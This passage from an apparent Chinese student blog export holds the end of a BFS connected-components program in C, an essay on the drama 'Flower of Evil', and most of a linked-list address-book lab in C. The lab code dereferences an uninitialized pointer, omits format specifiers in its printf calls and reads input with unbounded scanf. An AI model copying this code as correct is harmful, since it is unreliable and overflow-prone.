class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;	<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;		<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line">    count = BfsTraverse(g);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n 该图共有 %d 个连通分量。\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>恶之花有感</title>
    <url>/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p>
<p>即使不愿成为太阳，却依然绚烂夺目。</p>
]]></content>
      <categories>
        <category>影视有感</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构第一次实验-简易通讯录</title>
    <url>/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="数据结构第一次实验-—-简易通讯录"><a href="#数据结构第一次实验-—-简易通讯录" class="headerlink" title="数据结构第一次实验 — 简易通讯录"></a>数据结构第一次实验 — 简易通讯录</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];  <span class="comment">//编号</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">5</span>];  <span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">char</span> tele[<span class="number">20</span>];<span class="comment">//电话</span></span><br><span class="line">    <span class="keyword">char</span> add[<span class="number">30</span>]; <span class="comment">//住址</span></span><br><span class="line">    <span class="keyword">char</span> group[<span class="number">20</span>];<span class="comment">//分组</span></span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span>&#123;</span></span><br><span class="line">    Person data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line">List *L = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一、初始化通讯录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    L = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化通讯录成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二、创建 通讯录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;		<span class="comment">// 插入 记录 计数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;		<span class="comment">//作为是否继续录入的标志</span></span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//前插</span></span><br><span class="line">        node-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//三、创建 通讯录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node,*tail;</span><br><span class="line">    tail = L;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//尾插</span></span><br><span class="line">        tail-&gt;next = node;</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        tail = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//四、删除记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dele_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p = L-&gt;next;</span><br><span class="line">    List *q = L;  		<span class="comment">//使 q 始终指向 p 的前一个结点</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要删除的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;  <span class="comment">//查找 需要删除的节点位置 p</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        q-&gt;next = p-&gt;next;			<span class="comment">//删除 p 所指结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您所删除的信息是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>,p-&gt;data.group);</span><br><span class="line">        <span class="built_in">free</span>(p);				<span class="comment">//释放空间</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人信息！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//五、插入记录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q,*r,*node;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要插入的记录 ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入结点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断 ID 是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID,node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">NULL</span>) <span class="comment">//ID 重复</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.group));</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果没有该ID</span></span><br><span class="line">		<span class="keyword">int</span> select1;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select1);</span><br><span class="line">		<span class="keyword">if</span> (select1 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//给新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//给新节点输入数据</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复,请重新输入!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	node-&gt;next = q-&gt;next;</span><br><span class="line">	q-&gt;next = node;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//六、插入记录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_behind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	List *p, *r, *q, *node;</span><br><span class="line">	p = L-&gt;next;</span><br><span class="line">	q = L;</span><br><span class="line">	<span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的位置(输入该位置的ID)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;ID);</span><br><span class="line">	<span class="keyword">while</span> (p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//为新节点分配空间</span></span><br><span class="line">		node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">		<span class="comment">//为新节点输入数据</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断ID是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		node-&gt;next = p-&gt;next;</span><br><span class="line">		p-&gt;next = node;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//通讯录中未找到该ID</span></span><br><span class="line">		<span class="keyword">int</span> select2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select2);</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//为新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//为新节点录入信息</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">			node-&gt;next = q-&gt;next;</span><br><span class="line">			q-&gt;next = node;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//七、修改通讯录记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    p = 